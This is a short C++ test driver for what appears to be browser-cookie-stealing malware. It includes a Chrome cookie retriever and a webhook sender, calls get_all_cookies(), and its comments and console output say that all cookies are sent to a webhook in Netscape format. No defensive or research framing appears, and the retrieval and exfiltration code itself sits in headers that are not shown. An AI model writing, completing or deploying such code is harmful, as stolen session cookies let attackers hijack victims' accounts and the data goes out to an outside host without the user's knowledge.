#include "webhook_sender.hpp"
#include "chrome_cookie_retriever.hpp"
#include <iostream>
#include <chrono>
#include <thread>

int main() {
    try {
        std::cout << "Starting cookie retrieval and webhook test..." << std::endl;

        // Create cookie retriever with webhook URL
        cookie_retriever::ChromeCookieRetriever retriever;

        std::cout << "\nRetrieving cookies..." << std::endl;

        // Get all cookies and send to webhook in Netscape format
        retriever.get_all_cookies();

        std::cout << "\nDone! Check your webhook for the Netscape-formatted cookies." << std::endl;
        return 0;
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
}
